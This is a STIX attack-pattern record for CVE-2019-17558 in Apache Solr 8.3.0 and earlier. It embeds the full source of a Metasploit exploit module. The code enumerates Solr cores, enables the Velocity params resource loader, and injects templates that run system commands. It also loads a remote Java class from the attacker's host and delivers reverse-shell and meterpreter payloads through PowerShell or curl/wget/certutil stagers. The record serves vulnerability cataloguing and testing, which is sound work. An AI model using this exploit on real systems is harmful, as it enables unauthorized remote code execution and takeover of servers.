{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b449ec89-333f-4780-9f78-97fc3db8cd3b",
    "created": "2024-08-14T17:11:28.080203Z",
    "modified": "2024-08-14T17:11:28.080207Z",
    "name": "Apache Solr Remote Code Execution via Velocity Template",
    "description": " This module exploits a vulnerability in Apache Solr <= 8.3.0 which allows remote code execution via a custom Velocity template. Currently, this module only supports Solr basic authentication.  From the Tenable advisory: An attacker could target a vulnerable Apache Solr instance by first identifying a list of Solr core names. Once the core names have been identified, an attacker can send a specially crafted HTTP POST request to the Config API to toggle the params resource loader value for the Velocity Response Writer in the solrconfig.xml file to true. Enabling this parameter would allow an attacker to use the Velocity template parameter in a specially crafted Solr request, leading to RCE.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/solr_velocity_rce.rb",
            "external_id": "solr_velocity_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-17558"
        },
        {
            "source_name": "reference",
            "url": "https://www.tenable.com/blog/apache-solr-vulnerable-to-remote-code-execution-zero-day-vulnerability"
        },
        {
            "source_name": "reference",
            "url": "https://www.huaweicloud.com/en-us/notice/2018/20191104170849387.html"
        },
        {
            "source_name": "reference",
            "url": "https://gist.github.com/s00py/a1ba36a3689fa13759ff910e179fc133/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/jas502n/solr_rce"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/AleWong/Apache-Solr-RCE-via-Velocity-template"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Powershell\n  include Msf::Exploit::Remote::HttpClient\n\n  include Msf::Exploit::Remote::Java::HTTP::ClassLoader\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Apache Solr Remote Code Execution via Velocity Template',\n        'Description' => %q{\n          This module exploits a vulnerability in Apache Solr <= 8.3.0 which allows remote code execution via a custom\n          Velocity template. Currently, this module only supports Solr basic authentication.\n\n          From the Tenable advisory:\n          An attacker could target a vulnerable Apache Solr instance by first identifying a list\n          of Solr core names. Once the core names have been identified, an attacker can send a specially crafted\n          HTTP POST request to the Config API to toggle the params resource loader value for the Velocity Response\n          Writer in the solrconfig.xml file to true. Enabling this parameter would allow an attacker to use the Velocity\n          template parameter in a specially crafted Solr request, leading to RCE.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          's00py', # Discovery and PoC\n          'jas502n', # exploit code on Github\n          'AleWong', # ExploitDB contribution, and exploit code on Github\n          'Imran E. Dawoodjee <imran[at]threathounds.com>' # Metasploit module\n        ],\n        'References' => [\n          [ 'EDB', '47572' ],\n          [ 'CVE', '2019-17558' ],\n          [ 'URL', 'https://www.tenable.com/blog/apache-solr-vulnerable-to-remote-code-execution-zero-day-vulnerability'],\n          [ 'URL', 'https://www.huaweicloud.com/en-us/notice/2018/20191104170849387.html'],\n          [ 'URL', 'https://gist.github.com/s00py/a1ba36a3689fa13759ff910e179fc133/'],\n          [ 'URL', 'https://github.com/jas502n/solr_rce'],\n          [ 'URL', 'https://github.com/AleWong/Apache-Solr-RCE-via-Velocity-template'],\n        ],\n        'Platform' => ['linux', 'unix', 'win'],\n        'Targets' => [\n          [\n            'Java (in-memory)',\n            {\n              'Platform' => 'java',\n              'Arch' => ARCH_JAVA,\n              'Type' => :java,\n              'DefaultOptions' => { 'PAYLOAD' => 'java/meterpreter/reverse_tcp' }\n            }\n          ],\n          [\n            'Unix (in-memory)',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_memory,\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' }\n            }\n          ],\n          [\n            'Linux (dropper)',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' },\n              'CmdStagerFlavor' => %w[curl wget]\n            }\n          ],\n          [\n            'x86/x64 Windows PowerShell',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :windows_psh,\n              'DefaultOptions' => { 'PAYLOAD' => 'windows/meterpreter/reverse_tcp' }\n            }\n          ],\n          [\n            'x86/x64 Windows CmdStager',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :windows_cmdstager,\n              'DefaultOptions' => { 'PAYLOAD' => 'windows/meterpreter/reverse_tcp', 'CmdStagerFlavor' => 'vbs' },\n              'CmdStagerFlavor' => %w[vbs certutil]\n            }\n          ],\n          [\n            'Windows Exec',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_CMD,\n              'Type' => :windows_exec,\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/windows/generic' }\n            }\n          ],\n        ],\n        'DisclosureDate' => '2019-10-29', # ISO-8601 formatted\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [CONFIG_CHANGES]\n        },\n        'Privileged' => false\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8983),\n        OptString.new('USERNAME', [false, 'Solr username', 'solr']),\n        OptString.new('PASSWORD', [false, 'Solr password', 'SolrRocks']),\n        OptString.new('TARGETURI', [false, 'Path to Solr', '/solr/'])\n      ]\n    )\n  end\n\n  # if we are going to exploit, we only need one core to be exploitable\n  @vuln_core = ''\n  # OS specific stuff\n  @target_platform = ''\n  # if authentication is used\n  @auth_string = ''\n\n  def check_auth\n    # see if authentication is required for the specified Solr instance\n    auth_check = solr_get(\n      'uri' => normalize_uri(target_uri.path, '/admin/info/system'),\n      'vars_get' => { 'wt' => 'json' }\n    )\n\n    # successfully connected?\n    unless auth_check\n      print_bad('Connection failed!')\n      return nil\n    end\n\n    # if response code is not 200, then the Solr instance definitely requires authentication\n    unless auth_check.code == 200\n      # if authentication is required and creds are not provided, we cannot reliably check exploitability\n      if datastore['USERNAME'] == '' && datastore['PASSWORD'] == ''\n        print_bad('Credentials not provided, skipping credentialed check...')\n        return nil\n      end\n\n      # otherwise, try the given creds\n      auth_string = basic_auth(datastore['USERNAME'], datastore['PASSWORD'])\n      attempt_auth = solr_get(\n        'uri' => normalize_uri(target_uri.path, '/admin/info/system'),\n        'vars_get' => { 'wt' => 'json' },\n        'auth' => auth_string\n      )\n\n      # successfully connected?\n      unless attempt_auth\n        print_bad('Connection failed!')\n        return nil\n      end\n\n      # if the return code is not 200, then authentication definitely failed\n      unless attempt_auth.code == 200\n        print_bad('Invalid credentials!')\n        return nil\n      end\n\n      store_valid_credential(\n        user: datastore['USERNAME'],\n        private: datastore['PASSWORD'],\n        private_type: :password,\n        proof: attempt_auth.to_s\n      )\n\n      @auth_string = auth_string\n      # return the response for use in check/exploit\n      return attempt_auth\n    end\n\n    print_status(\"#{peer}: Authentication not required\")\n    # return the response for use in check/exploit\n    auth_check\n  end\n\n  # check for vulnerability existence\n  def check\n    auth_res = check_auth\n    unless auth_res\n      return CheckCode::Unknown('Authentication failed!')\n    end\n\n    # convert to JSON\n    ver_json = auth_res.get_json_document\n    # get Solr version\n    solr_version = Rex::Version.new(ver_json['lucene']['solr-spec-version'])\n    print_status(\"Found Apache Solr #{solr_version}\")\n    # get OS version details\n    @target_platform = ver_json['system']['name']\n    target_arch = ver_json['system']['arch']\n    target_osver = ver_json['system']['version']\n    print_status(\"OS version is #{@target_platform} #{target_arch} #{target_osver}\")\n    # uname doesn't show up for Windows, so run a check for that\n    if ver_json['system']['uname']\n      # print uname only when verbose\n      vprint_status(\"Full uname is '#{ver_json['system']['uname'].strip}'\")\n    end\n\n    # the vulnerability is only present in Solr versions <= 8.3.0\n    unless solr_version <= Rex::Version.new('8.3.0')\n      return CheckCode::Safe('Running version of Solr is not vulnerable!')\n    end\n\n    # enumerate cores\n    cores = solr_get(\n      'uri' => normalize_uri(target_uri.path, '/admin/cores'),\n      'vars_get' => { 'wt' => 'json' },\n      'auth' => @auth_string\n    )\n\n    # can't connect? that's yet another automatic failure\n    unless cores\n      return CheckCode::Unknown('Could not enumerate cores!')\n    end\n\n    # convert to JSON yet again\n    cores_json = cores.get_json_document\n    # draw up an array of all the cores\n    cores_list = Array.new\n    # get the core names\n    cores_json['status'].each_key do |core_name|\n      cores_list.push(core_name)\n    end\n\n    # no cores? that means nothing to exploit.\n    if cores_list.empty?\n      return CheckCode::Safe('No cores found, nothing to exploit!')\n    end\n\n    # got cores? tell the operator which cores were found\n    print_status(\"Found core(s): #{cores_list.join(', ')}\")\n    possibly_vulnerable_cores = {}\n\n    cores_list.each do |core|\n      # for each core, attempt to get config\n      core_config_json = get_response_writer_config(core.to_s)\n\n      if core_config_json.dig('config', 'queryResponseWriter').blank?\n        print_error(\"Failed to get queryResponseWriter configuration for core '#{core}'\")\n        next\n      end\n\n      core_config_json['config']['queryResponseWriter'].each do |writer_name, writer_config|\n        # The default name is 'velocity' but a queryResponseWriter can have an\n        # arbitrary name. The classname is diagnostic.\n        next unless writer_config['class'] == 'solr.VelocityResponseWriter'\n\n        print_good(\"Found Velocity Response Writer in use by core '#{core}'\")\n        vprint_status(\"Writer config: #{writer_config}\")\n\n        # String 'true' from the remote configuration, not TrueClass\n        if writer_config['params.resource.loader.enabled'] == 'true'\n          print_good(\"params.resource.loader.enabled for core '#{core}' is set to true.\")\n          possibly_vulnerable_cores.store(core, writer_name)\n        else\n          # if params.resource.loader.enabled is false, we need to set it to true before exploitation\n          print_warning(\"params.resource.loader.enabled for core '#{core}' is set to false.\")\n          possibly_vulnerable_cores.store(core, false)\n        end\n      end\n    end\n\n    # look at the array of possibly vulnerable cores\n    if possibly_vulnerable_cores.empty?\n      CheckCode::Safe('No cores are vulnerable!')\n    else\n      # if possible, pick a core that already has params.resource.loader.enabled set to true\n      possibly_vulnerable_cores.each do |core|\n        if core[1]\n          @vuln_core = core\n          break\n        end\n      end\n      # otherwise, just pick the first one\n      if @vuln_core.to_s == ''\n        @vuln_core = possibly_vulnerable_cores.first\n      end\n      CheckCode::Vulnerable\n    end\n  end\n\n  def get_response_writer_config(core)\n    core_config = solr_get(\n      'uri' => normalize_uri(target_uri.path, core.to_s, 'config', 'queryResponseWriter'),\n      'auth' => @auth_string\n    )\n\n    if core_config\n      return core_config.get_json_document\n    else\n      print_error(\"Could not retrieve configuration for core '#{core}'!\")\n      return nil\n    end\n  end\n\n  def change_response_writer(core, verb: 'update')\n    # the new config in JSON format\n    enable_params_resource_loader = {\n      \"#{verb}-queryresponsewriter\": {\n        startup: 'lazy',\n        name: 'velocity',\n        class: 'solr.VelocityResponseWriter',\n        # \"template.base.dir\": \"\",\n        # \"solr.resource.loader.enabled\": \"true\",\n        \"params.resource.loader.enabled\": 'true'\n      }\n    }.to_json\n\n    opts_post = {\n      'method' => 'POST',\n      'connection' => 'Keep-Alive',\n      'ctype' => 'application/json;charset=utf-8',\n      'encode_params' => false,\n      'uri' => normalize_uri(target_uri.path, core, 'config'),\n      'data' => enable_params_resource_loader\n    }\n\n    unless @auth_string == ''\n      opts_post.store('authorization', @auth_string)\n    end\n\n    print_status(\"params.resource.loader.enabled is false for '#{core}', trying to #{verb} it...\")\n    update_config = send_request_cgi(opts_post)\n\n    unless update_config\n      fail_with Failure::Unreachable, 'Connection failed!'\n    end\n\n    # if we got anything other than a 200 back, the configuration update failed and the exploit won't work\n    unless update_config.code == 200\n      fail_with Failure::UnexpectedReply, 'Unable to update config, exploit failed!'\n    end\n\n    update_config.get_json_document\n  end\n\n  # the exploit method\n  def exploit\n    unless [CheckCode::Vulnerable].include? check\n      fail_with Failure::NotVulnerable, 'Target is most likely not vulnerable!'\n    end\n\n    print_status(\"Targeting core '#{@vuln_core[0]}'\")\n\n    # if params.resource.loader.enabled for that core is false\n    if !@vuln_core[1]\n      response_json = change_response_writer(@vuln_core[0], verb: 'update')\n\n      if response_json.key?('errorMessages')\n        server_error = response_json['errorMessages'].first['errorMessages']&.first\n        print_error(\"Error updating config, here's the message from the server: \\\"#{server_error}\\\"\")\n        # rubocop:disable Lint/UselessAssignment\n        response_json = change_response_writer(@vuln_core[0], verb: 'create')\n        # rubocop:enable Lint/UselessAssignment\n      end\n    end\n\n    core_config_json = get_response_writer_config(@vuln_core[0])\n\n    if core_config_json.dig('config', 'queryResponseWriter', 'velocity', 'params.resource.loader.enabled')\n      print_good(\"params.resource.loader.enabled is true for core '#{@vuln_core[0]}'\")\n    else\n      print_warning(\"Config change appears to have failed but I'll try anyway. Wish me luck.\")\n    end\n\n    case target.name\n    when /Java/\n      @classloader_uri = start_service\n      execute_java('core_name' => @vuln_core[0], 'auth_string' => @auth_string)\n      return\n    end\n\n    # windows...\n    if @target_platform.include? 'Windows'\n      # if target is wrong, warn and exit before doing anything\n      unless target.name.include? 'Windows'\n        fail_with Failure::BadConfig, 'Target is found to be Windows, please select the proper target!'\n      end\n\n      case target['Type']\n      # PowerShell...\n      when :windows_psh\n        # need PowerShell for this\n        winenv_path = execute_command('C:\\\\Windows\\\\System32\\\\cmd.exe /c PATH', 'auth_string' => @auth_string, 'core_name' => @vuln_core[0], 'winenv_check' => true)\n        unless winenv_path\n          fail_with Failure::Unreachable, 'Connection failed!'\n        end\n\n        # did the command to check for PATH execute?\n        unless winenv_path.code == 200\n          fail_with Failure::UnexpectedReply, 'Unexpected reply from target, aborting!'\n        end\n\n        # is PowerShell in PATH?\n        if /powershell/i =~ winenv_path.body.to_s\n          # only interested in the contents of PATH. Everything before it is irrelevant\n          paths = winenv_path.body.split('=')[1]\n          # confirm that PowerShell exists in the PATH by checking each one\n          paths.split(';').each do |path_val|\n            # if PowerShell exists in PATH, then we are good to go\n            unless /powershell/i =~ path_val\n              next\n            end\n\n            print_good(\"Found Powershell at #{path_val}\")\n            # generate PowerShell command, encode with base64, and remove comspec\n            psh_cmd = cmd_psh_payload(payload.encoded, payload_instance.arch.first, encode_final_payload: true, remove_comspec: true)\n            # specify full path to PowerShell\n            psh_cmd.insert(0, path_val)\n            # exploit the thing\n            execute_command(psh_cmd, 'auth_string' => @auth_string, 'core_name' => @vuln_core[0])\n            break\n          end\n        else\n          fail_with Failure::BadConfig, 'PowerShell not found!'\n        end\n      # ... CmdStager ...\n      when :windows_cmdstager\n        print_status('Sending CmdStager payload...')\n        execute_cmdstager(linemax: 7130, 'auth_string' => @auth_string, 'core_name' => @vuln_core[0])\n      # ... or plain old exec?\n      when :windows_exec\n        cmd = \"C:\\\\Windows\\\\System32\\\\cmd.exe /c #{payload.encoded}\"\n        execute_command(cmd, 'auth_string' => @auth_string, 'core_name' => @vuln_core[0])\n      end\n    end\n\n    # ... or nix-based?\n    if @target_platform.include? 'Linux'\n      # if target is wrong, warn and exit before doing anything\n      if target.name.include? 'Windows'\n        fail_with Failure::BadConfig, 'Target is found to be nix-based, please select the proper target!'\n      end\n\n      case target['Type']\n      when :linux_dropper\n        execute_cmdstager('auth_string' => @auth_string, 'core_name' => @vuln_core[0])\n      when :unix_memory\n        cmd = \"/bin/bash -c $@|/bin/bash . echo #{payload.encoded}\"\n        execute_command(cmd, 'auth_string' => @auth_string, 'core_name' => @vuln_core[0])\n      end\n    end\n  end\n\n  # some prep work has to be done to work around the limitations of Java's Runtime.exec()\n  def execute_cmdstager_begin(_opts)\n    if @target_platform.include? 'Windows'\n      @cmd_list.each do |command|\n        command.insert(0, 'C:\\\\Windows\\\\System32\\\\cmd.exe /c ')\n      end\n    else\n      @cmd_list.each do |command|\n        command.insert(0, '/bin/bash -c $@|/bin/bash . echo ')\n      end\n    end\n  end\n\n  def execute_java(opts = {})\n    template =\n      %q{\n      #set($_=\"\")\n      #set($c=$_.getClass().getClass())\n      #set($a=$c.forName(\"java.util.ArrayList\"))\n      #set($l=$a.newInstance())\n      #set($o=$c.forName(\"java.lang.Object\"))\n      #set($q=$a.getMethod(\"add\",$o).invoke($l,\"x\"))\n      #set($i=$c.forName(\"java.lang.Integer\").getField(\"TYPE\").get(null))\n      #set($url=$c.forName(\"java.net.URL\").getConstructor($c.forName(\"java.lang.String\")).newInstance(\"} + @classloader_uri + %q{\"))\n      #set($ani=$c.forName(\"java.lang.reflect.Array\").getMethod(\"newInstance\",$c,$i))\n      #set($l[0]=$ani.invoke(null,$c.forName(\"java.net.URL\"),1))\n      #set($l[0][0]=$url)\n      #set($url_cl=$c.forName(\"java.net.URLClassLoader\").getConstructor($c.forName(\"[Ljava.net.URL;\")).newInstance($l.toArray()))\n      #set($z=$url_cl.loadClass(\"metasploit.Payload\"))\n      #set($l[0]=$ani.invoke(null,$c.forName(\"java.lang.String\"),0))\n      #set($_=$z.getMethod(\"main\",$c.forName(\"[Ljava.lang.String;\")).invoke(null,$l.toArray()))\n    }\n\n=begin\n    # Here's an example of a template that can base64 decode a header.\n    # This only works on Solr versions after 6.6 that introduced the\n    # getHttpSolrCall method, allowing us access to the request headers. Also,\n    # java.util.Base64 was introduced in java 1.8, so older installs are\n    # likely not to have that either.\n    %q{\n      #set($b=$request.getHttpSolrCall().req.getHeader(\"X-A00\"))\n      #set($c=$b.getClass().getClass())\n      #set($s=$c.forName(\"java.lang.String\").getConstructor(\"[B\"))\n      #set($d=$c.forName(\"java.util.Base64\").getMethod(\"getDecoder\",null).invoke(null, null))\n      #set($payloadByteArray=$d.decode($b))\n      #set($decoded_str=$s.invoke($payloadByteArray))\n      $decoded_str\n    }\n=end\n\n    # execute the exploit...\n    raw_result = solr_get(\n      'uri' => normalize_uri(target_uri.path, opts['core_name'].to_s, 'select'),\n      'auth' => opts['auth_string'],\n      'vars_get' => {\n        'q' => '1',\n        'wt' => 'velocity',\n        'v.template' => 'custom',\n        'v.template.custom' => template.gsub(/^[[:space:]]*/, '')\n      }\n    )\n\n    # This will give you a Java stack trace from the remote side to help with\n    # debugging payload templates.\n    if raw_result&.code != 200\n      # pp raw_result.headers\n      vprint_error raw_result.body\n      fail_with Failure::PayloadFailed, 'Velocity template caused an exception on the server'\n    end\n  end\n\n  # sic 'em, bois!\n  def execute_command(cmd, opts = {})\n    # custom template which enables command execution\n    template = %q{\n      #set($c = $request.getParams().get(\"c\"))\n      #set($x=\"\")\n      #set($rt=$x.class.forName(\"java.lang.Runtime\"))\n      #set($ex=$rt.getRuntime().exec($c))\n    }\n\n    # the next 2 lines cause problems with CmdStager, so it's only used when needed\n    # during the check for PowerShell existence, or by specific payloads\n    if opts['winenv_check'] || target['Type'] == :windows_exec || target['Type'] == :unix_memory\n      template += <<~VELOCITY\n        #set($a=$ex.waitFor())\n        #set($out=$ex.getInputStream())\n        #if($out.available() > 0)\n          #set($chr=$x.class.forName(\"java.lang.Character\"))\n          #set($str=$x.class.forName(\"java.lang.String\"))\n          #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end\n        #end\n      VELOCITY\n    end\n\n    # execute the exploit...\n    # POST, so our payload doesn't end up in logs\n    raw_result = solr_get(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, opts['core_name'].to_s, 'select'),\n      'auth' => opts['auth_string'],\n      'vars_post' => {\n        'q' => '1',\n        'wt' => 'velocity',\n        'v.template' => 'custom',\n        'v.template.custom' => template.gsub(/^[[:space:]]*/, ''),\n        'c' => cmd\n      },\n      'timeout' => 1\n    )\n\n    # Executing PATH always gives a result, so it can return safely\n    if opts['winenv_check']\n      return raw_result\n    end\n\n    # for printing command output\n    unless raw_result.nil?\n      unless raw_result.code == 200\n        vprint_error raw_result.body\n        fail_with Failure::PayloadFailed, 'Payload failed to execute!'\n      end\n\n      # to get pretty output\n      result_inter = raw_result.body.to_s.sub(\"0\\n\", ':::').split(':::').last\n      unless result_inter.nil?\n        final_result = result_inter.split(\"\\n\").first.strip\n        print_good(final_result)\n      end\n    end\n  end\n\n  # make sending requests easier\n  def solr_get(opts = {})\n    send_request_cgi_opts = {\n      'method' => 'GET',\n      'connection' => 'Keep-Alive',\n      'uri' => opts['uri']\n    }.merge(opts)\n\n    # @auth_string defaults to \"\" if no authentication is necessary\n    # otherwise, authentication is required\n    if opts['auth'] != ''\n      send_request_cgi_opts.store('authorization', opts['auth'])\n    end\n\n    # a bit unrefined, but should suffice in this case\n    if opts['vars_get']\n      send_request_cgi_opts.store('vars_get', opts['vars_get'])\n    end\n\n    send_request_cgi(send_request_cgi_opts)\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-10-29, # ISO-8601 formatted",
    "x_mitre_platforms": [
        "win'"
    ]
}